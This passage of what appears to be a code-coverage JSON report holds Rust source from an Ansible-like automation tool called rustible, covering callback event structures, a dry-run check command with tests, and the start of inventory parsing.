false,\n            diff_mode: false,\n            verbosity: 0,\n            extra_vars: HashMap::new(),\n        }\n    }\n\n    /// Set the file path.\n    pub fn with_file_path(mut self, path: impl Into\u003cPathBuf\u003e) -\u003e Self {\n        self.file_path = Some(path.into());\n        self\n    }\n\n    /// Set the play count.\n    pub fn with_play_count(mut self, count: usize) -\u003e Self {\n        self.play_count = count;\n        self\n    }\n\n    /// Set check mode.\n    pub fn with_check_mode(mut self, enabled: bool) -\u003e Self {\n        self.check_mode = enabled;\n        self\n    }\n\n    /// Set diff mode.\n    pub fn with_diff_mode(mut self, enabled: bool) -\u003e Self {\n        self.diff_mode = enabled;\n        self\n    }\n\n    /// Set verbosity level.\n    pub fn with_verbosity(mut self, level: u8) -\u003e Self {\n        self.verbosity = level;\n        self\n    }\n}\n\n/// Information about a play being executed.\n#[derive(Debug, Clone, Serialize, Deserialize)]\npub struct PlayInfo {\n    /// Name of the play\n    pub name: String,\n    /// Host pattern for this play\n    pub hosts_pattern: String,\n    /// Resolved hosts for this play\n    #[serde(default)]\n    pub hosts: Vec\u003cString\u003e,\n    /// Number of hosts targeted\n    pub host_count: usize,\n    /// Play-level variables (sanitized)\n    #[serde(default)]\n    pub vars: IndexMap\u003cString, JsonValue\u003e,\n    /// Serial execution value (if set)\n    pub serial: Option\u003cusize\u003e,\n    /// Whether fact gathering is enabled\n    pub gather_facts: bool,\n    /// Whether become is enabled for this play\n    #[serde(rename = \"become\")]\n    pub become_enabled: bool,\n    /// Become user (if specified)\n    pub become_user: Option\u003cString\u003e,\n    /// Connection type (if specified)\n    pub connection: Option\u003cString\u003e,\n    /// Strategy for this play\n    pub strategy: Option\u003cString\u003e,\n    /// Number of tasks in this play\n    pub task_count: usize,\n    /// Number of handlers in this play\n    pub handler_count: usize,\n    /// Tags applied to this play\n    #[serde(default)]\n    pub tags: Vec\u003cString\u003e,\n}\n\nimpl PlayInfo {\n    /// Create a new PlayInfo.\n    pub fn new(name: impl Into\u003cString\u003e, hosts_pattern: impl Into\u003cString\u003e) -\u003e Self {\n        Self {\n            name: name.into(),\n            hosts_pattern: hosts_pattern.into(),\n            hosts: Vec::new(),\n            host_count: 0,\n            vars: IndexMap::new(),\n            serial: None,\n            gather_facts: true,\n            become_enabled: false,\n            become_user: None,\n            connection: None,\n            strategy: None,\n            task_count: 0,\n            handler_count: 0,\n            tags: Vec::new(),\n        }\n    }\n\n    /// Set the resolved hosts.\n    pub fn with_hosts(mut self, hosts: Vec\u003cString\u003e) -\u003e Self {\n        self.host_count = hosts.len();\n        self.hosts = hosts;\n        self\n    }\n\n    /// Set the task count.\n    pub fn with_task_count(mut self, count: usize) -\u003e Self {\n        self.task_count = count;\n        self\n    }\n\n    /// Set the handler count.\n    pub fn with_handler_count(mut self, count: usize) -\u003e Self {\n        self.handler_count = count;\n        self\n    }\n\n    /// Set gather_facts.\n    pub fn with_gather_facts(mut self, enabled: bool) -\u003e Self {\n        self.gather_facts = enabled;\n        self\n    }\n}\n\n/// Information about a task being executed.\n#[derive(Debug, Clone, Serialize, Deserialize)]\npub struct TaskInfo {\n    /// Task name\n    pub name: String,\n    /// Module being executed\n    pub module: String,\n    /// Module arguments (sanitized, secrets removed)\n    #[serde(default)]\n    pub args: IndexMap\u003cString, JsonValue\u003e,\n    /// Host on which the task is executing\n    pub host: String,\n    /// Unique task identifier (for correlation)\n    pub task_uuid: String,\n    /// Task path in the playbook (e.g., \"tasks[2]\")\n    pub task_path: Option\u003cString\u003e,\n    /// Action plugin being used (may differ from module)\n    pub action: String,\n    /// Whether the task has a when condition\n    pub is_conditional: bool,\n    /// Whether the task has loop items\n    pub is_loop: bool,\n    /// Number of loop items (if is_loop is true)\n    pub loop_count: Option\u003cusize\u003e,\n    /// Tags applied to this task\n    #[serde(default)]\n    pub tags: Vec\u003cString\u003e,\n    /// Whether ignore_errors is set\n    pub ignore_errors: bool,\n    /// Delegate host (if delegated)\n    pub delegate_to: Option\u003cString\u003e,\n    /// Whether run_once is set\n    pub run_once: bool,\n}\n\nimpl TaskInfo {\n    /// Create a new TaskInfo.\n    pub fn new(\n        name: impl Into\u003cString\u003e,\n        module: impl Into\u003cString\u003e,\n        host: impl Into\u003cString\u003e,\n    ) -\u003e Self {\n        let module_str = module.into();\n        Self {\n            name: name.into(),\n            module: module_str.clone(),\n            args: IndexMap::new(),\n            host: host.into(),\n            task_uuid: generate_uuid(),\n            task_path: None,\n            action: module_str,\n            is_conditional: false,\n            is_loop: false,\n            loop_count: None,\n            tags: Vec::new(),\n            ignore_errors: false,\n            delegate_to: None,\n            run_once: false,\n        }\n    }\n\n    /// Set the module arguments.\n    pub fn with_args(mut self, args: IndexMap\u003cString, JsonValue\u003e) -\u003e Self {\n        self.args = args;\n        self\n    }\n\n    /// Set the task UUID.\n    pub fn with_uuid(mut self, uuid: impl Into\u003cString\u003e) -\u003e Self {\n        self.task_uuid = uuid.into();\n        self\n    }\n\n    /// Set the task path.\n    pub fn with_path(mut self, path: impl Into\u003cString\u003e) -\u003e Self {\n        self.task_path = Some(path.into());\n        self\n    }\n\n    /// Set whether this is a conditional task.\n    pub fn with_conditional(mut self, is_conditional: bool) -\u003e Self {\n        self.is_conditional = is_conditional;\n        self\n    }\n\n    /// Set loop information.\n    pub fn with_loop(mut self, count: usize) -\u003e Self {\n        self.is_loop = true;\n        self.loop_count = Some(count);\n        self\n    }\n\n    /// Set ignore_errors.\n    pub fn with_ignore_errors(mut self, ignore: bool) -\u003e Self {\n        self.ignore_errors = ignore;\n        self\n    }\n}\n\n/// Result information from task execution.\n#[derive(Debug, Clone, Serialize, Deserialize)]\npub struct ResultInfo {\n    /// Task status\n    pub status: TaskStatus,\n    /// Whether something was changed\n    pub changed: bool,\n    /// Message from the task\n    pub msg: Option\u003cString\u003e,\n    /// Diff information (if diff_mode enabled)\n    pub diff: Option\u003cDiffInfo\u003e,\n    /// Return code (for command/shell tasks)\n    pub rc: Option\u003ci32\u003e,\n    /// Standard output (truncated for large outputs)\n    pub stdout: Option\u003cString\u003e,\n    /// Standard error (truncated for large outputs)\n    pub stderr: Option\u003cString\u003e,\n    /// Whether output was truncated\n    pub output_truncated: bool,\n    /// Module-specific result data\n    #[serde(default)]\n    pub data: IndexMap\u003cString, JsonValue\u003e,\n    /// Execution duration for this task\n    #[serde(with = \"duration_serde\")]\n    pub duration: Duration,\n    /// Start time of task execution\n    #[serde(skip)]\n    pub start_time: Option\u003cInstant\u003e,\n    /// End time of task execution\n    #[serde(skip)]\n    pub end_time: Option\u003cInstant\u003e,\n}\n\nimpl Default for ResultInfo {\n    fn default() -\u003e Self {\n        Self {\n            status: TaskStatus::Ok,\n            changed: false,\n            msg: None,\n            diff: None,\n            rc: None,\n            stdout: None,\n            stderr: None,\n            output_truncated: false,\n            data: IndexMap::new(),\n            duration: Duration::ZERO,\n            start_time: None,\n            end_time: None,\n        }\n    }\n}\n\nimpl ResultInfo {\n    /// Create a new ResultInfo with Ok status.\n    pub fn ok() -\u003e Self {\n        Self::default()\n    }\n\n    /// Create a new ResultInfo with Changed status.\n    pub fn changed() -\u003e Self {\n        Self {\n            status: TaskStatus::Changed,\n            changed: true,\n            ..Default::default()\n        }\n    }\n\n    /// Create a new ResultInfo with Failed status.\n    pub fn failed(msg: impl Into\u003cString\u003e) -\u003e Self {\n        Self {\n            status: TaskStatus::Failed,\n            msg: Some(msg.into()),\n            ..Default::default()\n        }\n    }\n\n    /// Create a new ResultInfo with Skipped status.\n    pub fn skipped(msg: impl Into\u003cString\u003e) -\u003e Self {\n        Self {\n            status: TaskStatus::Skipped,\n            msg: Some(msg.into()),\n            ..Default::default()\n        }\n    }\n\n    /// Create a new ResultInfo with Unreachable status.\n    pub fn unreachable(msg: impl Into\u003cString\u003e) -\u003e Self {\n        Self {\n            status: TaskStatus::Unreachable,\n            msg: Some(msg.into()),\n            ..Default::default()\n        }\n    }\n\n    /// Create from a TaskResult.\n    pub fn from_task_result(result: \u0026TaskResult, duration: Duration) -\u003e Self {\n        Self {\n            status: result.status,\n            changed: result.changed,\n            msg: result.msg.clone(),\n            diff: result.diff.as_ref().map(DiffInfo::from_task_diff),\n            rc: None,\n            stdout: None,\n            stderr: None,\n            output_truncated: false,\n            data: result\n                .result\n                .as_ref()\n                .and_then(|v| v.as_object())\n                .map(|o| o.iter().map(|(k, v)| (k.clone(), v.clone())).collect())\n                .unwrap_or_default(),\n            duration,\n            start_time: None,\n            end_time: None,\n        }\n    }\n\n    /// Set the message.\n    pub fn with_msg(mut self, msg: impl Into\u003cString\u003e) -\u003e Self {\n        self.msg = Some(msg.into());\n        self\n    }\n\n    /// Set the diff information.\n    pub fn with_diff(mut self, diff: DiffInfo) -\u003e Self {\n        self.diff = Some(diff);\n        self\n    }\n\n    /// Set command output.\n    pub fn with_output(mut self, rc: i32, stdout: String, stderr: String) -\u003e Self {\n        self.rc = Some(rc);\n        self.stdout = Some(truncate_output(\u0026stdout, MAX_OUTPUT_LENGTH));\n        self.stderr = Some(truncate_output(\u0026stderr, MAX_OUTPUT_LENGTH));\n        self.output_truncated =\n            stdout.len() \u003e MAX_OUTPUT_LENGTH || stderr.len() \u003e MAX_OUTPUT_LENGTH;\n        self\n    }\n\n    /// Set the duration.\n    pub fn with_duration(mut self, duration: Duration) -\u003e Self {\n        self.duration = duration;\n        self\n    }\n}\n\n/// Maximum length for stdout/stderr in events (to prevent memory issues).\nconst MAX_OUTPUT_LENGTH: usize = 10_000;\n\n/// Truncate output to a maximum length.\nfn truncate_output(s: \u0026str, max_len: usize) -\u003e String {\n    if s.len() \u003c= max_len {\n        s.to_string()\n    } else {\n        format!(\"{}... (truncated, {} bytes total)\", \u0026s[..max_len], s.len())\n    }\n}\n\n/// Diff information showing before/after state.\n#[derive(Debug, Clone, Serialize, Deserialize)]\npub struct DiffInfo {\n    /// Content before the change\n    pub before: Option\u003cString\u003e,\n    /// Content after the change\n    pub after: Option\u003cString\u003e,\n    /// Header/label for the before content\n    pub before_header: Option\u003cString\u003e,\n    /// Header/label for the after content\n    pub after_header: Option\u003cString\u003e,\n    /// Prepared unified diff (if available)\n    pub prepared: Option\u003cString\u003e,\n}\n\nimpl DiffInfo {\n    /// Create a new DiffInfo.\n    pub fn new() -\u003e Self {\n        Self {\n            before: None,\n            after: None,\n            before_header: None,\n            after_header: None,\n            prepared: None,\n        }\n    }\n\n    /// Create from a TaskDiff.\n    pub fn from_task_diff(diff: \u0026TaskDiff) -\u003e Self {\n        Self {\n            before: diff.before.clone(),\n            after: diff.after.clone(),\n            before_header: diff.before_header.clone(),\n            after_header: diff.after_header.clone(),\n            prepared: None,\n        }\n    }\n\n    /// Set before content.\n    pub fn with_before(mut self, content: impl Into\u003cString\u003e) -\u003e Self {\n        self.before = Some(content.into());\n        self\n    }\n\n    /// Set after content.\n    pub fn with_after(mut self, content: impl Into\u003cString\u003e) -\u003e Self {\n        self.after = Some(content.into());\n        self\n    }\n}\n\nimpl Default for DiffInfo {\n    fn default() -\u003e Self {\n        Self::new()\n    }\n}\n\n// ============================================================================\n// Timing Context\n// ============================================================================\n\n/// Timing information for performance tracking.\n#[derive(Debug, Clone, Serialize, Deserialize)]\npub struct TimingInfo {\n    /// Start timestamp (milliseconds since epoch)\n    pub start_ms: u64,\n    /// End timestamp (milliseconds since epoch)\n    pub end_ms: Option\u003cu64\u003e,\n    /// Duration in milliseconds\n    pub duration_ms: Option\u003cu64\u003e,\n}\n\nimpl TimingInfo {\n    /// Create a new TimingInfo starting now.\n    pub fn start_now() -\u003e Self {\n        Self {\n            start_ms: current_time_ms(),\n            end_ms: None,\n            duration_ms: None,\n        }\n    }\n\n    /// Mark the timing as complete.\n    pub fn complete(\u0026mut self) {\n        let now = current_time_ms();\n        self.end_ms = Some(now);\n        self.duration_ms = Some(now.saturating_sub(self.start_ms));\n    }\n}\n\n/// Get current time in milliseconds since Unix epoch.\nfn current_time_ms() -\u003e u64 {\n    std::time::SystemTime::now()\n        .duration_since(std::time::UNIX_EPOCH)\n        .map(|d| d.as_millis() as u64)\n        .unwrap_or(0)\n}\n\n/// Generate a UUID v4 string.\nfn generate_uuid() -\u003e String {\n    // Simple UUID generation without external dependency\n    use std::time::{SystemTime, UNIX_EPOCH};\n    let now = SystemTime::now()\n        .duration_since(UNIX_EPOCH)\n        .unwrap_or_default();\n    let rand_part: u64 = now.as_nanos() as u64 ^ (now.as_secs() \u003c\u003c 32);\n    format!(\n        \"{:08x}-{:04x}-4{:03x}-{:04x}-{:012x}\",\n        (rand_part \u003e\u003e 32) as u32,\n        ((rand_part \u003e\u003e 16) \u0026 0xFFFF) as u16,\n        (rand_part \u0026 0x0FFF) as u16,\n        (0x8000 | (rand_part \u0026 0x3FFF)) as u16,\n        rand_part \u0026 0xFFFFFFFFFFFF\n    )\n}\n\n// ============================================================================\n// Event Metadata\n// ============================================================================\n\n/// Metadata attached to every callback event.\n#[derive(Debug, Clone, Serialize, Deserialize)]\npub struct EventMetadata {\n    /// Unique event identifier\n    pub event_id: String,\n    /// Timestamp when the event was created\n    pub timestamp: u64,\n    /// Correlation ID for tracking related events\n    pub correlation_id: Option\u003cString\u003e,\n    /// Playbook run UUID\n    pub playbook_uuid: String,\n    /// Sequence number within the playbook run\n    pub sequence: u64,\n}\n\nimpl EventMetadata {\n    /// Create new metadata for an event.\n    pub fn new(playbook_uuid: impl Into\u003cString\u003e, sequence: u64) -\u003e Self {\n        Self {\n            event_id: generate_uuid(),\n            timestamp: current_time_ms(),\n            correlation_id: None,\n            playbook_uuid: playbook_uuid.into(),\n            sequence,\n        }\n    }\n\n    /// Set the correlation ID.\n    pub fn with_correlation(mut self, id: impl Into\u003cString\u003e) -\u003e Self {\n        self.correlation_id = Some(id.into());\n        self\n    }\n}\n\n/// An event with its metadata.\n#[derive(Debug, Clone, Serialize, Deserialize)]\npub struct CallbackEventWithMeta {\n    /// The event itself\n    pub event: CallbackEvent,\n    /// Event metadata\n    pub metadata: EventMetadata,\n}\n\nimpl CallbackEventWithMeta {\n    /// Create a new event with metadata.\n    pub fn new(event: CallbackEvent, metadata: EventMetadata) -\u003e Self {\n        Self { event, metadata }\n    }\n}\n\n// ============================================================================\n// Serde Helpers\n// ============================================================================\n\n/// Serde module for Duration serialization.\nmod duration_serde {\n    use serde::{Deserialize, Deserializer, Serialize, Serializer};\n    use std::time::Duration;\n\n    #[derive(Serialize, Deserialize)]\n    struct DurationHelper {\n        secs: u64,\n        nanos: u32,\n    }\n\n    pub fn serialize\u003cS\u003e(duration: \u0026Duration, serializer: S) -\u003e Result\u003cS::Ok, S::Error\u003e\n    where\n        S: Serializer,\n    {\n        let helper = DurationHelper {\n            secs: duration.as_secs(),\n            nanos: duration.subsec_nanos(),\n        };\n        helper.serialize(serializer)\n    }\n\n    pub fn deserialize\u003c'de, D\u003e(deserializer: D) -\u003e Result\u003cDuration, D::Error\u003e\n    where\n        D: Deserializer\u003c'de\u003e,\n    {\n        let helper = DurationHelper::deserialize(deserializer)?;\n        Ok(Duration::new(helper.secs, helper.nanos))\n    }\n}\n\n// ============================================================================\n// Tests\n// ============================================================================\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n\n    #[test]\n    fn test_callback_event_type() {\n        let event = CallbackEvent::PlaybookStart {\n            playbook: PlaybookInfo::new(\"test\"),\n            started_at: None,\n        };\n        assert_eq!(event.event_type(), \"playbook_start\");\n    }\n\n    #[test]\n    fn test_callback_event_host() {\n        let task = TaskInfo::new(\"Test task\", \"debug\", \"server1\");\n        let event = CallbackEvent::TaskOk {\n            task,\n            result: ResultInfo::ok(),\n            is_handler: false,\n        };\n        assert_eq!(event.host(), Some(\"server1\"));\n    }\n\n    #[test]\n    fn test_callback_event_is_failure() {\n        let task = TaskInfo::new(\"Test task\", \"debug\", \"server1\");\n        let event = CallbackEvent::TaskFailed {\n            task: task.clone(),\n            result: ResultInfo::failed(\"test error\"),\n            ignore_errors: false,\n            is_handler: false,\n        };\n        assert!(event.is_failure());\n\n        let event_ignored = CallbackEvent::TaskFailed {\n            task,\n            result: ResultInfo::failed(\"test error\"),\n            ignore_errors: true,\n            is_handler: false,\n        };\n        assert!(!event_ignored.is_failure());\n    }\n\n    #[test]\n    fn test_playbook_info_builder() {\n        let info = PlaybookInfo::new(\"my-playbook\")\n            .with_file_path(\"/path/to/playbook.yml\")\n            .with_play_count(3)\n            .with_check_mode(true);\n\n        assert_eq!(info.name, \"my-playbook\");\n        assert_eq!(\n            info.file_path,\n            Some(PathBuf::from(\"/path/to/playbook.yml\"))\n        );\n        assert_eq!(info.play_count, 3);\n        assert!(info.check_mode);\n    }\n\n    #[test]\n    fn test_task_info_builder() {\n        let info = TaskInfo::new(\"Install nginx\", \"package\", \"webserver1\")\n            .with_conditional(true)\n            .with_loop(5)\n            .with_ignore_errors(true);\n\n        assert_eq!(info.name, \"Install nginx\");\n        assert_eq!(info.module, \"package\");\n        assert_eq!(info.host, \"webserver1\");\n        assert!(info.is_conditional);\n        assert!(info.is_loop);\n        assert_eq!(info.loop_count, Some(5));\n        assert!(info.ignore_errors);\n    }\n\n    #[test]\n    fn test_result_info_from_task_result() {\n        let task_result = TaskResult {\n            status: TaskStatus::Changed,\n            changed: true,\n            msg: Some(\"Package installed\".to_string()),\n            result: None,\n            diff: None,\n        };\n\n        let result_info = ResultInfo::from_task_result(\u0026task_result, Duration::from_millis(1500));\n\n        assert_eq!(result_info.status, TaskStatus::Changed);\n        assert!(result_info.changed);\n        assert_eq!(result_info.msg, Some(\"Package installed\".to_string()));\n        assert_eq!(result_info.duration, Duration::from_millis(1500));\n    }\n\n    #[test]\n    fn test_truncate_output() {\n        let short = \"short string\";\n        assert_eq!(truncate_output(short, 100), short);\n\n        let long = \"x\".repeat(200);\n        let truncated = truncate_output(\u0026long, 100);\n        assert!(truncated.contains(\"truncated\"));\n        assert!(truncated.contains(\"200 bytes\"));\n    }\n\n    #[test]\n    fn test_event_serialization() {\n        let event = CallbackEvent::TaskOk {\n            task: TaskInfo::new(\"Test\", \"debug\", \"localhost\"),\n            result: ResultInfo::ok().with_msg(\"Success\"),\n            is_handler: false,\n        };\n\n        let json = serde_json::to_string(\u0026event).unwrap();\n        assert!(json.contains(\"task_ok\"));\n\n        let deserialized: CallbackEvent = serde_json::from_str(\u0026json).unwrap();\n        assert_eq!(deserialized.event_type(), \"task_ok\");\n    }\n\n    #[test]\n    fn test_timing_info() {\n        let mut timing = TimingInfo::start_now();\n        assert!(timing.start_ms \u003e 0);\n        assert!(timing.end_ms.is_none());\n\n        timing.complete();\n        assert!(timing.end_ms.is_some());\n        assert!(timing.duration_ms.is_some());\n    }\n\n    #[test]\n    fn test_event_metadata() {\n        let meta = EventMetadata::new(\"playbook-123\", 1);\n        assert!(!meta.event_id.is_empty());\n        assert_eq!(meta.playbook_uuid, \"playbook-123\");\n        assert_eq!(meta.sequence, 1);\n    }\n\n    #[test]\n    fn test_generate_uuid() {\n        let uuid1 = generate_uuid();\n        let uuid2 = generate_uuid();\n        // UUIDs should be non-empty and different (with high probability)\n        assert!(!uuid1.is_empty());\n        assert!(!uuid2.is_empty());\n        // Format check: xxxxxxxx-xxxx-4xxx-xxxx-xxxxxxxxxxxx\n        assert!(uuid1.contains(\"-4\"));\n    }\n\n    #[test]\n    fn test_diff_info() {\n        let diff = DiffInfo::new()\n            .with_before(\"old content\")\n            .with_after(\"new content\");\n\n        assert_eq!(diff.before, Some(\"old content\".to_string()));\n        assert_eq!(diff.after, Some(\"new content\".to_string()));\n    }\n\n    #[test]\n    fn test_result_info_with_output() {\n        let result = ResultInfo::ok().with_output(0, \"stdout content\".to_string(), \"\".to_string());\n\n        assert_eq!(result.rc, Some(0));\n        assert_eq!(result.stdout, Some(\"stdout content\".to_string()));\n        assert!(!result.output_truncated);\n    }\n\n    #[test]\n    fn test_play_info_builder() {\n        let info = PlayInfo::new(\"Configure web servers\", \"webservers\")\n            .with_hosts(vec![\"web1\".to_string(), \"web2\".to_string()])\n            .with_task_count(5)\n            .with_handler_count(2)\n            .with_gather_facts(false);\n\n        assert_eq!(info.name, \"Configure web servers\");\n        assert_eq!(info.hosts_pattern, \"webservers\");\n        assert_eq!(info.host_count, 2);\n        assert_eq!(info.task_count, 5);\n        assert_eq!(info.handler_count, 2);\n        assert!(!info.gather_facts);\n    }\n\n    #[test]\n    fn test_callback_event_with_meta() {\n        let event = CallbackEvent::Debug {\n            msg: \"Test message\".to_string(),\n            host: None,\n            data: None,\n        };\n        let meta = EventMetadata::new(\"run-123\", 42);\n        let event_with_meta = CallbackEventWithMeta::new(event, meta);\n\n        assert_eq!(event_with_meta.metadata.sequence, 42);\n        assert_eq!(event_with_meta.event.event_type(), \"debug\");\n    }\n}\n","traces":[{"line":407,"address":[],"length":0,"stats":{"Line":0}},{"line":409,"address":[],"length":0,"stats":{"Line":0}},{"line":412,"address":[],"length":0,"stats":{"Line":0}},{"line":413,"address":[],"length":0,"stats":{"Line":0}},{"line":417,"address":[],"length":0,"stats":{"Line":0}},{"line":422,"address":[],"length":0,"stats":{"Line":0}},{"line":423,"address":[],"length":0,"stats":{"Line":0}},{"line":424,"address":[],"length":0,"stats":{"Line":0}},{"line":491,"address":[],"length":0,"stats":{"Line":0}},{"line":493,"address":[],"length":0,"stats":{"Line":0}},{"line":494,"address":[],"length":0,"stats":{"Line":0}},{"line":495,"address":[],"length":0,"stats":{"Line":0}},{"line":497,"address":[],"length":0,"stats":{"Line":0}},{"line":506,"address":[],"length":0,"stats":{"Line":0}},{"line":578,"address":[],"length":0,"stats":{"Line":0}},{"line":580,"address":[],"length":0,"stats":{"Line":0}},{"line":581,"address":[],"length":0,"stats":{"Line":0}},{"line":582,"address":[],"length":0,"stats":{"Line":0}},{"line":583,"address":[],"length":0,"stats":{"Line":0}},{"line":584,"address":[],"length":0,"stats":{"Line":0}},{"line":590,"address":[],"length":0,"stats":{"Line":0}},{"line":604,"address":[],"length":0,"stats":{"Line":0}},{"line":605,"address":[],"length":0,"stats":{"Line":0}},{"line":606,"address":[],"length":0,"stats":{"Line":0}},{"line":610,"address":[],"length":0,"stats":{"Line":0}},{"line":611,"address":[],"length":0,"stats":{"Line":0}},{"line":612,"address":[],"length":0,"stats":{"Line":0}},{"line":703,"address":[],"length":0,"stats":{"Line":0}},{"line":706,"address":[],"length":0,"stats":{"Line":0}},{"line":712,"address":[],"length":0,"stats":{"Line":0}},{"line":715,"address":[],"length":0,"stats":{"Line":0}},{"line":721,"address":[],"length":0,"stats":{"Line":0}},{"line":724,"address":[],"length":0,"stats":{"Line":0}},{"line":753,"address":[],"length":0,"stats":{"Line":0}},{"line":754,"address":[],"length":0,"stats":{"Line":0}},{"line":755,"address":[],"length":0,"stats":{"Line":0}},{"line":832,"address":[],"length":0,"stats":{"Line":0}},{"line":833,"address":[],"length":0,"stats":{"Line":0}},{"line":834,"address":[],"length":0,"stats":{"Line":0}},{"line":838,"address":[],"length":0,"stats":{"Line":0}},{"line":839,"address":[],"length":0,"stats":{"Line":0}},{"line":840,"address":[],"length":0,"stats":{"Line":0}},{"line":930,"address":[],"length":0,"stats":{"Line":0}},{"line":932,"address":[],"length":0,"stats":{"Line":0}},{"line":933,"address":[],"length":0,"stats":{"Line":0}},{"line":935,"address":[],"length":0,"stats":{"Line":0}},{"line":941,"address":[],"length":0,"stats":{"Line":0}},{"line":942,"address":[],"length":0,"stats":{"Line":0}},{"line":943,"address":[],"length":0,"stats":{"Line":0}},{"line":983,"address":[],"length":0,"stats":{"Line":0}},{"line":984,"address":[],"length":0,"stats":{"Line":0}},{"line":986,"address":[],"length":0,"stats":{"Line":0}},{"line":993,"address":[],"length":0,"stats":{"Line":0}},{"line":994,"address":[],"length":0,"stats":{"Line":0}}],"covered":0,"coverable":54},{"path":["/","home","artur","Repositories","rustible","src","cli","commands","check.rs"],"content":"//! Check command - Dry-run mode\n//!\n//! This module implements the `check` subcommand for running playbooks in dry-run mode.\n\nuse super::{CommandContext, Runnable};\nuse crate::cli::commands::run::RunArgs;\nuse anyhow::Result;\nuse clap::Parser;\nuse std::path::PathBuf;\n\n/// Arguments for the check command\n#[derive(Parser, Debug, Clone)]\npub struct CheckArgs {\n    /// Path to the playbook file\n    #[arg(required = true)]\n    pub playbook: PathBuf,\n\n    /// Tags to run (only tasks with these tags)\n    #[arg(long, short = 't', action = clap::ArgAction::Append)]\n    pub tags: Vec\u003cString\u003e,\n\n    /// Tags to skip (skip tasks with these tags)\n    #[arg(long, action = clap::ArgAction::Append)]\n    pub skip_tags: Vec\u003cString\u003e,\n\n    /// Start at a specific task\n    #[arg(long)]\n    pub start_at_task: Option\u003cString\u003e,\n\n    /// Show differences\n    #[arg(long, short = 'D')]\n    pub diff: bool,\n\n    /// Ask for vault password\n    #[arg(long)]\n    pub ask_vault_pass: bool,\n\n    /// Vault password file\n    #[arg(long)]\n    pub vault_password_file: Option\u003cPathBuf\u003e,\n\n    /// Become (sudo/su)\n    #[arg(short = 'b', long)]\n    pub r#become: bool,\n\n    /// Become method (sudo, su, etc.)\n    #[arg(long, default_value = \"sudo\")]\n    pub become_method: String,\n\n    /// Become user\n    #[arg(long, default_value = \"root\")]\n    pub become_user: String,\n\n    /// Remote user\n    #[arg(short = 'u', long)]\n    pub user: Option\u003cString\u003e,\n\n    /// Private key file\n    #[arg(long)]\n    pub private_key: Option\u003cPathBuf\u003e,\n}\n\nimpl CheckArgs {\n    /// Execute the check command\n    pub async fn execute(\u0026self, ctx: \u0026mut CommandContext) -\u003e Result\u003ci32\u003e {\n        // Force check mode\n        ctx.check_mode = true;\n\n        // Enable diff mode if requested\n        if self.diff {\n            ctx.diff_mode = true;\n        }\n\n        // Convert to RunArgs and execute\n        let run_args = RunArgs {\n            playbook: self.playbook.clone(),\n            tags: self.tags.clone(),\n            skip_tags: self.skip_tags.clone(),\n            start_at_task: self.start_at_task.clone(),\n            step: false,\n            ask_vault_pass: self.ask_vault_pass,\n            vault_password_file: self.vault_password_file.clone(),\n            r#become: self.r#become,\n            become_method: self.r#become_method.clone(),\n            become_user: self.r#become_user.clone(),\n            ask_become_pass: false,\n            user: self.user.clone(),\n            private_key: self.private_key.clone(),\n            ssh_common_args: None,\n        };\n\n        ctx.output.banner(\"CHECK MODE - DRY RUN\");\n        ctx.output\n            .warning(\"No changes will be made to the target systems\");\n\n        run_args.execute(ctx).await\n    }\n}\n\n#[async_trait::async_trait]\nimpl Runnable for CheckArgs {\n    async fn run(\u0026self, ctx: \u0026mut CommandContext) -\u003e Result\u003ci32\u003e {\n        self.execute(ctx).await\n    }\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n\n    #[test]\n    fn test_check_args_parsing() {\n        let args = CheckArgs::try_parse_from([\"check\", \"playbook.yml\"]).unwrap();\n        assert_eq!(args.playbook, PathBuf::from(\"playbook.yml\"));\n    }\n\n    #[test]\n    fn test_check_args_with_diff() {\n        let args = CheckArgs::try_parse_from([\"check\", \"playbook.yml\", \"--diff\"]).unwrap();\n        assert!(args.diff);\n    }\n}\n","traces":[],"covered":0,"coverable":0},{"path":["/","home","artur","Repositories","rustible","src","cli","commands","inventory.rs"],"content":"//! Inventory commands - List hosts and tasks\n//!\n//! This module implements the `list-hosts` and `list-tasks` subcommands.\n\nuse super::{CommandContext, Runnable};\nuse anyhow::{Context, Result};\nuse clap::Parser;\nuse std::collections::HashMap;\nuse std::path::PathBuf;\n\n/// Arguments for list-hosts command\n#[derive(Parser, Debug, Clone)]\npub struct ListHostsArgs {\n    /// Host pattern to match\n    #[arg(default_value = \"all\")]\n    pub pattern: String,\n\n    /// Show host variables\n    #[arg(long)]\n    pub vars: bool,\n\n    /// Output as YAML\n    #[arg(long)]\n    pub yaml: bool,\n\n    /// Group by groups instead of flat list\n    #[arg(long)]\n    pub graph: bool,\n}\n\n/// Arguments for list-tasks command\n#[derive(Parser, Debug, Clone)]\npub struct ListTasksArgs {\n    /// Path to the playbook file\n    #[arg(required = true)]\n    pub playbook: PathBuf,\n\n    /// Show only tasks with these tags\n    #[arg(long, short = 't', action = clap::ArgAction::Append)]\n    pub tags: Vec\u003cString\u003e,\n\n    /// Include task details\n    #[arg(long)]\n    pub verbose: bool,\n}\n\n/// Host information\n#[derive(Debug, Clone, serde::Serialize)]\npub struct HostInfo {\n    pub name: String,\n    pub groups: Vec\u003cString\u003e,\n    pub vars: HashMap\u003cString, serde_yaml::Value\u003e,\n}\n\n/// Group information\n#[derive(Debug, Clone, serde::Serialize)]\npub struct GroupInfo {\n    pub name: String,\n    pub hosts: Vec\u003cString\u003e,\n    pub children: Vec\u003cString\u003e,\n    pub vars: HashMap\u003cString, serde_yaml::Value\u003e,\n}\n\n/// Inventory structure\n#[derive(Debug, Clone, Default, serde::Serialize)]\npub struct Inventory {\n    pub hosts: HashMap\u003cString, HostInfo\u003e,\n    pub groups: HashMap\u003cString, GroupInfo\u003e,\n}\n\nimpl Inventory {\n    /// Load inventory from a file\n    pub fn load(path: \u0026PathBuf) -\u003e Result\u003cSelf\u003e {\n        let content = std::fs::read_to_string(path)\n            .with_context(|| format!(\"Failed to read inventory file: {}\", path.display()))?;\n\n        // Determine format based on extension\n        if path\n            .extension()\n            .map_or(false, |ext| ext == \"yml\" || ext == \"yaml\")\n        {\n            Self::parse_yaml(\u0026content)\n        } else if path.extension().map_or(false, |ext| ext == \"json\") {\n            Self::parse_json(\u0026content)\n        } else {\n            // Try YAML first, then INI format\n            Self::parse_yaml(\u0026content).or_else(|_| Self::parse_ini(\u0026content))\n        }\n    }\n\n    /// Parse YAML inventory\n    fn parse_yaml(content: \u0026str) -\u003e Result\u003cSelf\u003e {\n        let yaml: serde_yaml::Value = serde_yaml::from_str(content)?;\n\n        let mut inventory = Inventory::default();\n\n        // Parse the 'all' group 